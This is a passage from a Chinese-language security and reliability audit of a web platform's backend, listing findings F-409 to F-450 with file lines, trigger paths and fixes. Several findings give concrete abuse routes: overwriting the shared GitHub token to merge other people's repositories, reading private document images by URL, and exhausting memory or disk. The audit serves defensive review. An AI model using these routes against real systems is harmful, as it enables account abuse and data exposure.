- 建议修法：同事务补 `opType=4` 流水（含 `quantity` 与 `balanceAfter`）。
- 是否当场可修：是。

#### F-409 佣金兜底校准路径 `tokenQuantity` 恒缺失，token 佣金永不补建且报成功
- 严重度：P2
- 文件与行号：`services/commission-settle-service.ts:65-68,77`；`services/commission-service.ts:143-145`
- 触发路径：支付回调漏发佣金 → 次日 `commission-settle-daily` 补建 → 只传 `{id}` → `tokenQuantity ?? 0` → `token > 0` 恒假。
- 根因：注释称「内部会从其他表获取」，实现并未获取；统计把扫描数当补建数。
- 证据：`:65-68` 构造的用户对象只有 id；`:77 missedOrders = scanned`。
- 影响面：普通上级 token 佣金永久漏发，任务日志仍显示成功。
- 建议修法：按订单 token 数回填基数后再调用；统计真实补建条数。
- 是否当场可修：是。

#### F-410 开发者提现只冻结不扣余额，冻结额仍可被 relay 消费
- 严重度：P2
- 文件与行号：`routes/developer.ts:795-828,689`；`services/relay-billing-service.ts:1525-1532`
- 触发路径：`POST /api/developer/withdrawals` 仅 `frozen += amount` 并写 `quantity:-amount` 的「假」流水；`tokenQuantity` 不变，而 relay 计费只校验 `tokenQuantity`。
- 根因：冻结未从可用余额扣除，且两条链路使用不同口径。
- 证据：`:795-828` 无 `tokenQuantity` 扣减；`:689` 只在前端展示层用 `token - frozen`；`relay-billing-service.ts:1525-1532` 读 `tokenQuantity`。
- 影响面：可一边打款提现、一边继续消费同一笔 token；流水与余额不符。
- 建议修法：冻结即扣 `tokenQuantity`，成功后不再扣；或计费口径统一为 `token - frozen`。
- 是否当场可修：是。

#### F-411 定时任务 `errors` 非空仍记 success
- 严重度：P3
- 文件与行号：`workers/scheduler-worker.ts:469-486,504-520`
- 触发路径：`expireVipMembers`/`calibrateCommissionSettlement` 返回非空 `errors` → 仍 `recordJobExecution(name,'success')`。
- 根因：只按「函数未抛错」判定成功。
- 证据：`:469-486` 与 `:504-520` 的 `recordJobExecution` 调用点无 `errors.length` 分支。
- 影响面：结算/降级全失败也显示成功，告警缺失。
- 建议修法：`errors.length > 0` 记 degraded/failed。
- 是否当场可修：是。

### B 路：媒体、文档与向量

#### F-412 `extract-assets` 把私有文档内嵌图片写入匿名公开目录
- 严重度：P2
- 文件与行号：`routes/files.ts:179,441-491`；`services/markdown-converter-service.ts:632-651`；`server.ts:721-732`
- 触发路径：对 `uploads/private` 的私有文件 `POST /api/files/:id/extract-assets` → 资产以随机 UUID 写入 `uploads/public` → 返回 `/uploads/<uuid>.png`，静态挂载无鉴权。
- 根因：资产目录固定为进程级 `UPLOAD_DIR`（public），未按源文件可见性分流。
- 证据：`files.ts:179` 的目录常量；`:471-473` 直接作 `writeToDir`；`server.ts:728-731` 静态服务无 `preHandler`；`resolveDiskPath` 可回退 private（`files.ts:56-60`）。
- 影响面：私有合同/证件扫描图变成持 URL 即可读。
- 建议修法：资产落到 `uploads/private/<owner>/` 或改签名 URL。
- 是否当场可修：是。

#### F-413 资产提取无总量上限，重复调用重复落盘
- 严重度：P2
- 文件与行号：`services/markdown-converter-service.ts:597-607,631-651`
- 触发路径：同一 `fileId` 反复 `POST /extract-assets`。
- 根因：只限制源文件 ≤20MB，未限制 `doc.assets` 条数与累计字节；每次新 UUID，不去重无 TTL。
- 证据：`:604` 只判 `bytes.length`；`:636-651` 逐条 `writeFileSync` 无累计；`:639` 文件名 `randomUUID()`。
- 影响面：高压缩比 docx/pptx 可膨胀到 GB 级，打满内存与公开磁盘；多份永不回收副本。
- 建议修法：设条数/累计字节上限，按源文件 sha 去重，失败清理已写文件。
- 是否当场可修：是。

#### F-414 Workbook `/open` 无大小限制且按全局 FIFO 逐出，单用户可挤掉他人会话
- 严重度：P2
- 文件与行号：`services/workbook-service.ts:46-48,300-309,544-582`；`routes/workbook.ts:110-113`；`services/storage-service.ts:117-124`
- 触发路径：上传 ≤100MB xlsx → 循环 `POST /api/workbook/open`。
- 根因：open 前无 `stat` 大小/扩展名校验，同步整文件读入并全量建模；会话表全局上限 64，按 `lastUsedAt` 逐出，不按主体配额。
- 证据：`:551 readFile(fileId)`；`:558 loadWorkbook`；`:566-581` 整簿与公式索引常驻 Map；`:410-421` 超限逐出（含他人未保存会话）。
- 影响面：64 个大会话常驻，他人会话被逐出后 410、未保存内容丢失；同步解析阻塞事件循环并易 OOM。
- 建议修法：open 前 `statSync` 限 20MB + 扩展名校验，改异步读；加每主体会话上限与定时清理。
- 是否当场可修：是。

#### F-415 Workbook `/save` 每次写新文件，无配额与生命周期
- 严重度：P3
- 文件与行号：`services/workbook-service.ts:770-792,804`
- 触发路径：同一 handle 反复 `POST /save`。
- 根因：每次 `generateFileId` + `saveFile` 新写，只 `push` 不删、无配额、无 TTL。
- 证据：`:772-790` 新 ID 写盘；`:149 savedFileIds` 只增不减。
- 影响面：单会话即可无限复制大工作簿占满磁盘。
- 建议修法：限制会话内保存次数/累计字节，覆盖上一版本或登记到期清理。
- 是否当场可修：是。

#### F-416 批量 embedding 不分片，超上游上限后整批静默失败
- 严重度：P2
- 文件与行号：`services/embedding-provider.ts:121-140,156-176`；`services/codebase-index-service.ts:200-221`
- 触发路径：仓库索引 `indexChunks` 对全部待嵌入文本一次性 `provider.embed(texts)`。
- 根因：provider 与调用方都不做条数/token 分片；超限或非 2xx 被 catch 吞掉。
- 证据：`codebase-index-service.ts:205-206` 一次提交全部；`embedding-provider.ts:129,163,213` 直接整包 `JSON.stringify`；`:216-221` 的 catch 使所有 chunk 以 `embedding=null` 入库。
- 影响面：大仓库全部切片失去向量，检索静默退化为关键词；重试成本高。
- 建议修法：按 25 条 / token 预算分片并逐批落库，失败可重试。
- 是否当场可修：是。

#### F-417 xlsx 解析无条件生成 text 与 markdown 两份全量副本
- 严重度：P3
- 文件与行号：`services/xlsx-parser.ts:313-339,352-368`；`services/document-parser.ts:287-289`
- 触发路径：RAG 入库解析 ≤10MB xlsx。
- 根因：`buildResult` 对每个 sheet 同时 `matrixToText` 与 `matrixToMarkdown`，唯一调用方只用 `.text`。
- 证据：`:328-329` 两次全量转换；`document-parser.ts:288-289` 仅取 `result.text`。
- 影响面：大表内存约为必要量 3-4 倍，易 OOM。
- 建议修法：加 `formats` 参数或惰性求值。
- 是否当场可修：是。

#### F-418 anydoc 加载失败被进程级永久缓存
- 严重度：P3
- 文件与行号：`services/document-parser.ts:71-87`；`services/markdown-converter-service.ts:69-86`
- 触发路径：首个请求动态 import 时瞬时失败（依赖未就绪/磁盘/ABI）。
- 根因：失败也把 `anydocLoadAttempted` 置 `true` 且不重置。
- 证据：`:75-76` 先置位再 import；`:81-85` catch 只 warn；两文件结构相同。
- 影响面：doc/ppt/odt/epub 在本进程生命周期内始终不可用，只能重启。
- 建议修法：失败不置位，或加 TTL/次数上限后重试。
- 是否当场可修：是。

### C 路：clawdbot 与生成队列

#### F-419 权限授权「读-改-写」非原子，并发撤销可被复活
- 严重度：P2
- 文件与行号：`services/permission-grants.ts:57-84,125-142,152-160`；入口 `routes/agent-control.ts:520-553`
- 触发路径：同一用户并发 POST/DELETE `/permission/grants`，或 GET（内部也写回过期清理）与创建交叠。
- 根因：load → filter → upsert 整行 JSON 覆盖，无事务/版本/CAS/行锁。
- 证据：`loadPermissionGrants` 返回数组且 `:75-82` 会写回；create `:125+137`、revoke `:152+155` 各自读写，中间无锁。
- 影响面：已撤销的工具授权被并发创建覆盖后重新生效，或新授权被旧快照覆盖丢失。
- 建议修法：授权拆表 + 唯一约束 + 单行 upsert/delete，或行锁 + 版本号。
- 是否当场可修：否（需表结构/事务改造）。

#### F-420 生成队列把「已完成」作业当重复，静默丢新任务
- 严重度：P2
- 文件与行号：`services/ai/generation-queue-service.ts:89-104,63`；入口 `routes/ai-generation.ts:40,85`
- 触发路径：相同 payload 首次已完成，窗口内再次提交 → jobId 复用 → BullMQ 返回旧 job，不新建。
- 根因：去重只判 `waiting`；`completed` 仍占着同一 jobId（`removeOnComplete.count=2000`）。
- 证据：`:63` 保留 2000 条完成作业；`:89` 指纹即 jobId；`:94` 只判 waiting；`:100-103` 复用 jobId add。
- 影响面：接口返回旧 jobId，实际未生成；客户端轮询到旧结果或永久等待。
- 建议修法：仅 waiting/active/delayed 复用；completed/failed 先 remove 或加时间桶后缀。
- 是否当场可修：是。

#### F-421 TaskExecutor 无生命周期控制：取消不生效、timeout 不执行、wait 无上限、Map 无界
- 严重度：P2
- 文件与行号：`services/clawdbot/task-executor.ts:28,47,61,92,96,132-176,179-187`；入口 `routes/clawdbot.ts:63-67,236-249`
- 触发路径：执行中 cancel；或创建 `step.type=wait, toolParams.ms=2^31-1`（`steps` 为 `z.array(z.unknown())` 原样透传）。
- 根因：cancel 只改状态并移出 running，执行循环与完成回写不检查；`timeout` 只保存从不读取；`setTimeout` 用原始 ms；`tasks` 无淘汰。
- 证据：`:132-176` 无 cancelled/超时判断；`:170-175` 无条件写 completed；`:143-144` 无 clamp；`:61` Map 无容量控制。
- 影响面：取消后仍有副作用且状态被覆写；5 个超长 wait 占满 `maxConcurrent=5`，后续任务全部拒跑；内存随创建数增长。
- 建议修法：每步前检查状态并引入 AbortSignal；clamp wait、按 timeout 包装；终态任务 LRU/定时清理。
- 是否当场可修：是。

#### F-422 Qoder 桥关停竞态：stop 后仍可拉起 Electron
- 严重度：P3
- 文件与行号：`services/qoder-bridge-client.ts:227,232-246,271-289`
- 触发路径：启动预热/重试退避期间 API 关停。
- 根因：`stopped` 只在 ensure 入口检查一次；重试循环与 `launchOnce` 完成后不回查。
- 证据：`:232-246` 循环无 stopped 判断；`:271-289` stop 只 kill 当前 child。
- 影响面：关停后残留进程与端口占用，重启时冲突或多实例。
- 建议修法：循环每轮及 spawn 前后检查 stopped，stop 清理启动 Promise。
- 是否当场可修：是。

#### F-423 PairingService 过期请求与会话永不删除，Map 无界增长
- 严重度：P3
- 文件与行号：`services/clawdbot/pairing.ts:38-40,61-62,92-93,127-137`；入口 `routes/clawdbot.ts:406-425`
- 触发路径：反复创建/确认配对（admin 面）。
- 根因：`cleanupExpired` 只改 status 并删 code 映射，不删 `requests`；`sessions` 只在 unpair 删。
- 证据：`:61/92` 无条件 set；`:127-137` 遍历后不 delete；`:104 getSessionByUser` 全量遍历。
- 影响面：长期运行内存泄漏，查询 O(n)。
- 建议修法：到期 delete；sessions 按 lastActive LRU/上限。
- 是否当场可修：是。

#### F-424 `listByUser` 先取全局前 N 再过滤，用户任务会漏
- 严重度：P3
- 文件与行号：`services/ai/generation-queue-service.ts:137-145`
- 触发路径：多用户并发时查询某用户任务列表。
- 根因：`getJobs(..., 0, limit-1)` 全局分页后才 `filter(data.userId)`。
- 证据：`:143` 全局取前 50；`:144` 再过滤。
- 影响面：目标用户可能 0 条，取消/重试误判。
- 建议修法：维护 userId→jobId 索引或独立队列键；至少返回截断标记。
- 是否当场可修：否。

### D 路：剩余路由

#### F-425 workspace/admin-api-platform 的 `:id` 未做 UUID 形状闸，非法字面量直达 SQL → 500
- 严重度：P3
- 文件与行号：`routes/workspace.ts:172`（`id: z.string()`），使用点 `:269,287,311,340,360,449,626,676,699,812,856`；同文件 `:97,:539` 已用 `z.uuid()`；`routes/admin-api-platform.ts:118,155,171,185,202,218,229`
- 触发路径：`GET /api/workspace/projects/abc`、`DELETE /api/admin/api-platform/apps/abc`。
- 根因：列为 uuid，非 uuid 触发 PG `22P02`，未兜住即 500。
- 证据：`files.ts:15-17`、`developer-api-keys.ts:29`、`billing.ts:27` 的 uuid 列定义；`workspace.ts:539` 同资源已用 uuid 闸。
- 影响面：存在性与服务故障同形；同资源不同方法守卫不一致。
- 建议修法：统一 `idParamSchema`/`isUuidString`，非法返回 400/404。
- 是否当场可修：是。

#### F-426 `/v1/agents` 分页无 ORDER BY
- 严重度：P3
- 文件与行号：`routes/v1-public.ts:1144-1149`
- 触发路径：翻页时同表并发写入。
- 根因：只有 `.limit/.offset`，无排序键。
- 证据：`:1144-1149` 无 `orderBy`。
- 影响面：翻页重复或漏行。
- 建议修法：`orderBy(desc(agents.createdAt), agents.agentId)`。
- 是否当场可修：是。

#### F-427 `/v1/agents/:id/call` 缺同资源已有的 UUID 闸
- 严重度：P3
- 文件与行号：`routes/v1-public.ts:1201-1250`（GET 在 `:1189` 有 `isUuidString`）
- 触发路径：`POST /v1/agents/abc/call` → `eq(agents.agentId,'abc')` → 22P02 → 500。
- 根因：同资源不同方法校验不一致。
- 证据：`:1189` 有闸；`:1201-1250` 无。
- 影响面：错误语义不一致；日志噪声。
- 建议修法：补同一形状闸。
- 是否当场可修：是。

#### F-428 `/v1/files` batch 分支错误路径泄漏 Redis 连接
- 严重度：P3
- 文件与行号：`routes/v1-public.ts:2349-2366`
- 触发路径：`saveBatchInput` 抛错进 catch → 500，`redis` 未 disconnect。
- 根因：只在成功路径 `disconnect()`。
- 证据：`:2349-2366` 的 try/catch 无 `finally`。
- 影响面：反复触发蓄积连接/内存。
- 建议修法：`finally` 内 disconnect。
- 是否当场可修：是。

#### F-429 API Key 更新/删除未接 step-up，与创建不一致
- 严重度：P2
- 文件与行号：`routes/developer.ts:491-524`（POST 有 `requireStepUpForTwoFactorUser`）vs `:527-536 DELETE`、`:539-557 PATCH`
- 触发路径：会话被窃且未过 TOTP → PATCH `permissions/rateLimit/expiresAt`，或将 `revoked` 改回 `active`。
- 根因：同资源不同方法守卫不一致。
- 证据：`:491-524` 的 preHandler 含 step-up；`:527-536`、`:539-557` 不含。
- 影响面：凭据权限被悄悄放大（仍拿不到 secret，故非直接接管）。
- 建议修法：PATCH/DELETE 同闸。
- 是否当场可修：是。

#### F-430 推荐位 `name` 直接充当全局唯一 `system_configs.key`，可跨类目占键
- 严重度：P3
- 文件与行号：`routes/admin-content-routes.ts:492-518,520-549`；`schema/system.ts:24`；`:436-437`（移动端 `key='preview-mode'`）
- 触发路径：创建/改名推荐位为已存在 key（含其他类目、含 `preview-mode`）→ 唯一约束未捕获 → 500；先占键后移动端 `onConflictDoUpdate` 只改 value。
- 根因：复用全局配置表且 key 无语义前缀。
- 证据：`system.ts:24 key ... .unique()`；`:436-437` 与推荐位共用命名空间。
- 影响面：配置读值跳变；类目数据错乱。
- 建议修法：key 加 category 前缀或改独立表；冲突转 409。
- 是否当场可修：是。

#### F-431 删除项目只清未删除文件，回收站 blob 永久成孤儿
- 严重度：P3
- 文件与行号：`routes/workspace.ts:306-331`；`db/workspace-queries.ts:145-149`；`schema/files.ts:15-17`
- 触发路径：项目内文件先软删 → 删除项目。
- 根因：`listFilesByProject` 过滤 `deletedAt`，软删文件不在清理列表；删项目后行级联消失，磁盘路径再无人可清。
- 证据：`workspace-queries.ts:145-149` 的过滤条件；`workspace.ts:306-331` 只遍历未删文件。
- 影响面：磁盘只增不减。
- 建议修法：改用含回收站的查询再 unlink，或删项目前先清 trash。
- 是否当场可修：是。

#### F-432 ACP 会话端点无持久化、无归属校验，任意 id 返回「成功」
- 严重度：P3
- 文件与行号：`routes/workspace.ts:773-883`
- 触发路径：`create` 只返回随机 UUID；`begin/end-prompt` 的 `id` 用 `z.string()`，不查会话、不校验 userId，直接回 `prompt_started/prompt_completed`。
- 根因：接口占位实现直接返回成功。
- 证据：`:836-847`、`:872-882` 的字面量返回；无会话表写入。
- 影响面：契约假成功；未来接执行层即越权。
- 建议修法：补会话表与 `(sessionId,userId)` 校验，或明确 501。
- 是否当场可修：否（需设计）。

### E 路：db 与 schema

#### F-433 `tool_invocation_ledger.user_id` 的 NOT NULL 与 ON DELETE SET NULL 互斥，删除用户必失败（已复核，P1）
- 严重度：P1
- 文件与行号：`packages/database/src/schema/tool-invocation-ledger.ts:72-74`；迁移 `packages/database/drizzle/20261024020000_tool_invocation_ledger.sql:42,66-67`
- 触发路径：用户注销/后台删除（`db/member-queries.ts:830`、`db/usercenter-queries.ts:78`、`routes/user/ai-users-routes.ts:141` 的 `DELETE FROM users`），且该用户在账本有记录（CLI 每次工具调用都写）。
- 根因：外键 `ON DELETE SET NULL` 需要把 `user_id` 置 NULL，而列是 `NOT NULL` → PG 报 `23502`，整个删除（含同事务清理）回滚。
- 证据：`tool-invocation-ledger.ts:72-74 references(...{ onDelete: 'set null' }).notNull()`；迁移 `:42 "user_id" uuid NOT NULL` + `:66-67 ... ON DELETE SET NULL`；同文件头注声称「用户删除保审计事实」。
- 影响面：任何用过 CLI 工具调用账本的账号无法注销；接口 500；审计保留策略失效。
- 建议修法：去掉 `.notNull()` 并补 `ALTER TABLE ... DROP NOT NULL`；或改 `RESTRICT` 并在业务层先解绑。
- 是否当场可修：是（含 1 条迁移）。

#### F-434 `customer_service_sessions.status` 默认值 `waiting` 与「唯一真相源」枚举互斥
- 严重度：P2
- 文件与行号：`packages/database/src/schema/customer-service.ts:133-135,148`；`packages/types/src/notification.ts:185-197,207`；`apps/api/src/db/customer-service-queries.ts:443,465`；迁移 `0043_neat_the_spike.sql:2342`
- 触发路径：创建会话不传 status → 落 `waiting`；`acceptSession` → 写 `active`。
- 根因：注释声明状态唯一真相源为 `CUSTOMER_SERVICE_STATUSES`（pending/open/resolved/closed/rejected），但默认值、写入值、TS 类型仍是旧词汇。
- 证据：`customer-service.ts:148 .default('waiting')`；迁移 `:2342 DEFAULT 'waiting'`；`notification.ts:189-195` 五值不含 waiting/active。
- 影响面：按枚举渲染/过滤的消费端永远匹配不到真实状态；类型契约与 DB 分叉。
- 建议修法：默认值改 `pending`、接受动作改 `open` 并迁移存量，或把旧值纳入枚举。
- 是否当场可修：是（需数据迁移）。

#### F-435 `sys_config.config_key` 无唯一约束且新增不查重
- 严重度：P3
- 文件与行号：`packages/database/src/schema/admin-sys.ts:171-182`；迁移 `0043_neat_the_spike.sql:1499-1510`；`apps/api/src/db/admin-sys-queries.ts:685-702`；`routes/admin-sys/config-routes.ts:74-82`
- 触发路径：两次相同 `configKey` 新建，或 PUT 改名撞已有 key。
- 根因：schema 与建表 SQL 均无 `UNIQUE(config_key)`；写入不查重；读取 `limit(1)` 无排序。
- 证据：`admin-sys.ts:174` 无 `.unique()`；`0043:1502` 无 UNIQUE；`admin-sys-queries.ts:686 .limit(1)`、`:700` 直接 insert。
- 影响面：按 key 取配置随机命中，改/删后读值跳变。
- 建议修法：加 `CREATE UNIQUE INDEX` + 应用层查重返回 409。
- 是否当场可修：是。

#### F-436 事务内再开 `db.transaction`，注释的 savepoint 假设不成立
- 严重度：P2
- 文件与行号：`db/commission-queries.ts:369-420`（`:381 db.transaction`）；`services/commission-service.ts:130-238`（`:159,:189,:222` 在外层 tx 内调用）
- 触发路径：支付成功/每日兜底 `createCommissionFlows` → 外层事务持有 `orders` 行锁与一条连接 → 内层 `createCommissionFlow` 用模块级 `db` 另借连接开启独立事务。
- 根因：Drizzle 只有 `tx.transaction` 才复用连接/转 savepoint；此处用了顶层 `db`。
- 证据：`commission-queries.ts:7 import { db }`、`:381 return db.transaction(...)`；外层 `commission-service.ts:130 await db.transaction(async (tx) => {` 内调用 `createCommissionFlow` 且未传 `tx`；`:170` 注释声称 savepoint。
- 影响面：内层先提交、外层回滚时佣金与钱包已入账，调用方收到失败且重试被 existing 判为已存在 → 账实分叉；主池 `max=40` 时 40 个并发回调互等连接。
- 建议修法：`createCommissionFlow` 增加 `tx` 入参；事务内禁止调用顶层 `db.transaction`。
- 是否当场可修：是。

---

## 十九、第十五轮新增（ai长尾 / v1-public / schema模式 / 事务嵌套 / 提现状态机）

> 基线：origin/main `c20e4a57`。五路并行。本轮开始出现明确的「零新增模式」结论（见 C 路 5 项、D 路 1 项），但仍新增 23 条。
> 主代理复核：F-450（`payment-recurring.ts:645-706`）、F-452（`finance-extended.ts:231-285,342-400`）、F-453（`admin-extended/order-routes.ts:76-93`）。

### A 路：AI 服务长尾

#### F-437 剧情顾问内存态无界 + story 被无条件覆盖
- 严重度：P2
- 文件与行号：`services/ai/plot-advisor-service.ts:43,46-56`；`routes/drama.ts:16-18,26-33,37,43`
- 触发路径：任意登录用户 `POST /api/drama/scripts/{任意id}/enhance`，`body.title` 无长度上限。
- 根因：模块级 `stories` 只 `set`，无 delete/TTL/容量；`createStory` 不判归属直接覆盖。
- 证据：`:54 stories.set(storyId, state)`；`:43` 无 get-or-create；`drama.ts:26` 仅 `authenticate`，`:37 id: z.string()` 无格式约束。
- 影响面：换 id / 超长 title 持续请求（单请求可近 Fastify 1MB 上限）→ 进程内存无界增长至 OOM；同 id 覆盖他人并发剧情上下文。
- 建议修法：Map 加 LRU/TTL + 条数上限；`createStory` 改 get-or-create 并绑定 userId；title 加 `max(200)`。
- 是否当场可修：是。

#### F-438 内部/自定义渠道「未发送」仍返回成功
- 严重度：P3
- 文件与行号：`services/clawdbot/channels.ts:104-106,130-139`；`routes/clawdbot.ts:358-359`
- 触发路径：管理员 `POST /api/clawdbot/channels/{web|api|custom}/send`。
- 根因：`dispatchToChannel` 对 web/api/custom 仅打日志即 return；`sendMessage` 随后 `emit('sent')` 并 `return true`，与 `:93` 注释「true ⇔ delivered」矛盾。
- 证据：`:104-106`、`:130-139`；`:93` 注释。
- 影响面：消息静默丢失却上报 `sent:true`；`broadcast` 计数虚高，编排层误判投递成功。
- 建议修法：内部渠道返回显式 skipped 三态结果并由路由透出。
- 是否当场可修：是。

#### F-439 `/models/complete` 未调用模型即返回成功
- 严重度：P3
- 文件与行号：`services/clawdbot/models.ts:133-157`（`:147-156`）；`routes/clawdbot.ts:309-313`
- 触发路径：管理员 `POST /api/clawdbot/models/complete`。
- 根因：`complete()` 不发起上游调用，直接返回占位字符串 + `finishReason:'stop'`，响应无 stub/degraded 标记。
- 证据：`:147-156` 为字面量返回。
- 影响面：自动化链路把占位文本当真实模型输出（失败当成功）且无法区分未接入。
- 建议修法：未接入抛 501 或返回 `stub:true`。
- 是否当场可修：是。

#### F-440 browser 页面缓存无上限、响应体无大小限制
- 严重度：P3
- 文件与行号：`services/clawdbot/browser.ts:54,70,80,150-156`；`routes/clawdbot.ts:449-464`
- 触发路径：管理员反复 `POST /clawdbot/browser/navigate|scrape`。
- 根因：`pages` Map 无 TTL/容量/淘汰，全仓无路由调用 `closePage`；`response.text()` 无字节上限。
- 证据：`:54`、`:70`、`:80` 的 Map 写入；`:150-156` 整页读取；路由层无 close 端点。
- 影响面：大页面/多次抓取累积致 OOM；navigate 把整页内容塞进响应。
- 建议修法：容量 + LRU/TTL、读取截断、补 close 路由。
- 是否当场可修：是。

#### F-441 enhance 单请求 4 次 LLM 且不记成本
- 严重度：P3
- 文件与行号：`services/ai/plot-advisor-service.ts:197,274,313,334`；`routes/drama.ts:44-46`
- 触发路径：同 F-437。
- 根因：`suggestChapterOutline` 内又调 `analyzePacing`，路由已单独调一次；`callRealLlm` 未传 userId，故不记 `ai_cost`。
- 证据：上述四处调用点；`crew-llm-adapter.ts:173` 的记账以 userId 为前提。
- 影响面：成本约 1.33 倍且不可归因；响应中 `pacing` 与 `outline` 依据两次不同结果，可能自相矛盾。
- 建议修法：pacing 作为参数传入 outline；补 userId 记账。
- 是否当场可修：是。

### B 路：v1-public 与 workspace-ai

#### F-442 GitHub 令牌为全站单文件，任意登录用户可覆盖/删除
- 严重度：P2
- 文件与行号：`routes/workspace-ai.ts:830-858,860-873,915-956`；`services/workspace-ai-service.ts:3383-3387,3411-3416`
- 触发路径：任一登录用户 `POST /github/token`（或完成自己的 device OAuth）→ 覆盖 `~/.ihui/github_token`；此后所有人的 PR/Issue 调用都用该 PAT；`DELETE` 清空全站。
- 根因：令牌无 userId 维度，只落进程级文件；`workspacePath` 收了却从不校验属主（`:835`）；`loadToken()` 仅 env 优先、文件次之。
- 证据：`workspace-ai-service.ts:3383-3387` 单文件读写；`:3411-3416` 无用户维度。
- 影响面：跨租户凭据污染/操作顶替；可让全站 GitHub 集成失效（部署若设 env `GITHUB_TOKEN` 则影响降级）。
- 建议修法：按 userId 加密存库，写入前校验工作区归属，删除仅限本人。
- 是否当场可修：是。

#### F-443 非流式成功流水按原始 model 计费，与流式/缓存不一致
- 严重度：P2
- 文件与行号：`routes/v1-public.ts:1628-1656,1719,1787,2114-2138`
- 触发路径：配置 `gpt-4o→deepseek-chat` 映射后，非流式请求 `gpt-4o` → 上游用映射模型，但 `:2117` 的 `model` 传原始名 → `recordCall` 按其定价；`:2128` metadata 不带 `modelMappingMeta`，而流式 `:872`、缓存 `:1801` 都带。
- 根因：该分支漏传 `resolvedModel`。
- 证据：`:2117` 与 `:872/:1801` 的对照。
- 影响面：计费口径分裂（多扣/少扣）；审计无法按模型对账。**同时修正 F-385 的计费证据**：白名单绕过成立，但计费侧并非统一取映射后模型，而是流式取映射、非流式取原始。
- 建议修法：`model: resolvedModel`，metadata 补 `modelMappingMeta`。
- 是否当场可修：是。

#### F-444 GitHub PR/Issue 端点任意 owner/repo + 全站 PAT
- 严重度：P2
- 文件与行号：`routes/workspace-ai.ts:1666-1797`；`services/workspace-ai-service.ts:3430-3500`
- 触发路径：任意登录用户 `PUT /github/prs/:number/merge {owner,repo}` 即用平台 PAT 合并任意仓库。
- 根因：无仓库白名单、无用户 GitHub 身份绑定。
- 证据：`:1666-1797` 的入参直接透传到 service；`:3430-3500` 用平台令牌调用。
- 影响面：以平台身份写/合并他人仓库；与 F-442 叠加可先植入自己 PAT 再操作。
- 建议修法：令牌绑定用户身份，或限定工作区 remote 的 owner/repo。
- 是否当场可修：是。

#### F-445 `/v1/models` 全局缓存混入调用者私有 BYOK 模型
- 严重度：P3
- 文件与行号：`routes/v1-public.ts:267,349-371,418-429,437-439,479-481`
- 触发路径：A 有 BYOK 私有模型并调用 `/v1/models` → `modelsCache` 含 A 私有模型；5 分钟内 B 调用且 DB 查询抛错/无可上架模型 → `:437`/`:479` 直接返回 A 的列表。
- 根因：缓存未按用户/凭据分键，私有段与公共段混存。
- 证据：`:267` 单 key 缓存；`:437-439`、`:479-481` 的兜底直接复用。
- 影响面：私有模型名跨租户泄漏；BYOK 用户可能看不到自己的模型。
- 建议修法：缓存按 userId 分键，只缓存公共段。
- 是否当场可修：是。

#### F-446 `/admin/system/tasks` 手动执行不执行却写「成功」日志
- 严重度：P3
- 文件与行号：`routes/admin-extended/system-routes.ts:29-39,128-147`
- 触发路径：`POST .../:id/run` 仅 insert `sysJobLogs.status='0'` 并返回 201，无任何 invoke；`GET ?status=failed|idle` 条件落空返回全量。
- 根因：无执行器（与 F-163 同源），但此处额外伪造成功记录。
- 证据：`:29-39` 的 insert 无调用；`:128-147` 的筛选条件不匹配。
- 影响面：运维误判已执行成功；failed 筛选失效。
- 建议修法：接入执行器或返回 501 且不写成功日志；补 failed 条件或 400。
- 是否当场可修：是。

#### F-447 `POST /v1/files` 先落盘后入库，失败不回收
- 严重度：P3
- 文件与行号：`routes/v1-public.ts:2386-2390,2414-2438`
- 触发路径：上传后 `writeFileSync` 成功，projects/files 插入抛错 → catch 仅 500，文件永留 `uploads/public`。
- 根因：无失败清理/无事务边界。
- 证据：`:2386-2390` 先写盘；`:2414-2438` 的 catch 无 unlink。
- 影响面：单 Key 重复触发可致磁盘只增不减（每请求 ≤100MB）。
- 建议修法：catch 内 `unlinkSync(filePath)`，或先入库后落盘。
- 是否当场可修：是。

### C 路：schema 与迁移模式化全扫

#### F-448 `ab_test_results` 唯一约束在 schema 与迁移间漂移，push/局部恢复后 upsert 必 42P10
- 严重度：P2
- 文件与行号：`packages/database/src/schema/ab-tests.ts:70-86`（无唯一约束、bucket 可空，仅普通索引）；`packages/database/drizzle/20260831000000_feature_gap_tables.sql:66-75`（同样无 UNIQUE）；对照 `drizzle/0043_neat_the_spike.sql:3072-3082`（`UNIQUE(variant_id,bucket)`、bucket NOT NULL）
- 触发路径：`routes/ab-testing.ts:441-442,484-485` 两处 `onConflictDoUpdate({ target: [variantId, bucket] })`。
- 根因：后续 schema 与迁移把唯一约束丢了，仅老迁移 0043 有；`drizzle-kit push` 或按 20260831 重建/恢复的库无此唯一索引。
- 证据：0043 与 20260831 对同表两种定义互斥。
- 影响面：AB 事件上报全部 500；同一 variant+bucket 重复写入。
- 建议修法：schema 补 `uniqueIndex(...).on(variantId,bucket)` 并生成迁移；bucket 改 `.notNull()`。
- 是否当场可修：是（需新迁移）。

#### F-449 课程/开发者金额用 `real` 存，支付金额源头失真
- 严重度：P3
- 文件与行号：`packages/database/src/schema/zhs-full.ts:309`（`amount: real`）、`:90`（`price: real`）；`drizzle/0044_silky_banshee.sql:880,710`
- 触发路径：`routes/payment-gateway.ts:600` `Math.round(coursePrice.amount*100)` 作为订单金额与客户端金额比对。
- 根因：金额用 float4，非整数分/`numeric`。
- 证据：上述列定义与 `:600` 的取整。
- 影响面：极端价位存在分位取整偏差；对账/退款数据不可精确复现。
- 建议修法：改 `numeric(12,2)` 或整数分。
- 是否当场可修：否（需数据迁移）。
- 复核结论：按域边界转资金/账本线（`amount/price: real` 属支付金额源头，不是教育/考试/考勤域缺陷），本域本轮不修。

> 本轮 schema 模式化负结论（**零新增**，已全部覆盖或不成立）：① `onDelete:'set null'` + `.notNull()` 全扫 117 处，严格链式正则 0 命中，仅 F-433；② onConflict 174 处/90 文件、逐目标核对约 40 张表，除 F-448 外均有唯一约束/主键；③ 软删唯一约束 28 处/6 文件，`oauth`/`edu_attendance_record`/`edu_payment_record` 均已带 `WHERE deleted_at IS NULL`；④ `real/doublePrecision` 32 处/13 文件，除 F-449 外均为分数/评分/成本估算；⑤ 索引：`20261106150000_fix_missing_indexes_fks.sql` 已补 164 条，重点表索引齐全。

### D 路：事务嵌套全仓扫描

#### F-450 代扣回调外层事务内再开多个事务，幂等/回滚失效（已复核，P1）
- 严重度：P1
- 文件与行号：`routes/payment-recurring.ts:650-705`（外层 `db.transaction`，`651-656` `FOR UPDATE` 锁合同）；`:680 placeOrder`、`:691 completeOrder`
